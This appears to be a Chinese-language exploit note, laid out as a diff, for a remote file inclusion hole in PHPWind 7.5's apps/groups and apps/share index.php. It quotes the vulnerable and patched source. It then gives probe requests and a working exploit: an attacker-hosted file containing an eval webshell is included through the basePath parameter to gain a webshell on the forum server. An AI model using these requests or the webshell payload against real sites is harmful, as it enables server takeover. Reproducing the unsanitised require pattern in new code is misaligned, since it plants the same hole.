@@ -1,0 +1,45 @@
+### PHPWind 7.5 apps/*/index.php 任意文件包含 —— 原始 EXP (来自情Blog / CSDN)
+
+# 发布下利用EXP
+# http://www.######.***/apps/groups/index.php?route=groups&basePath=http://<target>/qing.txt?
+# 浏览器访问
+# http://www.######.***/apps/groups/index.php?route=groups&basePath=http://<target>/qing.txt?密码qing520
+# 访问后就可以包含文件并获得webshell（问号要带上，不然会失败）
+# qing.txt 保存 php 大马
+
+### 源码（7.5，修复前形态）
+# apps/share/index.php
+if ($route == "share") {
+    require_once $basePath . '/action/m_share.php';
+} elseif ($route == "sharelink") {
+    require_once $basePath . '/action/m_sharelink.php';
+}
+# apps/groups/index.php
+if ($route == "groups") {
+    require_once $basePath . '/action/m_groups.php';
+} elseif ($route == "group") {
+    require_once $basePath . '/action/m_group.php';
+} elseif ($route == "galbum") {
+    require_once $basePath . '/action/m_galbum.php';
+}
+
+### 对照：PHPWind 8.7 同源源码（修复后形态，攻击面已关闭）
+# apps.php
+$appdir = app_specialRoute($q);
+if (!is_dir($appEntryBasePath = A_P . $appdir . '/')) Showmsg('undefined_action');
+$appEntry = $appEntryBasePath . 'index.php';
+require_once S::escapePath($appEntry);
+# apps/groups/index.php
+if ($q == "groups") { require_once S::escapePath($appEntryBasePath . 'action/m_groups.php'); }
+# require/security.php  escapePath 过滤清单
+$tmparray = array('://',"\0"); $ifCheck && $tmparray[] = '..';
+
+### 目标侧探测请求（各 1 个包，先判变量可不可控再谈挂马）
+GET /bbs/apps/groups/index.php?route=groups&basePath=./data/bbscache HTTP/1.1
+GET /bbs/apps/share/index.php?route=share&basePath=./data/bbscache HTTP/1.1
+GET /bbs/apps.php?q=groups&route=groups&basePath=./data/bbscache HTTP/1.1
+
+### 远程包含 EXP（需 allow_url_include=On）
+# VPS: /var/www/html/x.txt  ->  <?php @eval($_POST[0]);?>
+GET /bbs/apps/groups/index.php?route=groups&basePath=http://VPS_IP/x.txt? HTTP/1.1
+# 注意末尾 '?' 不可省
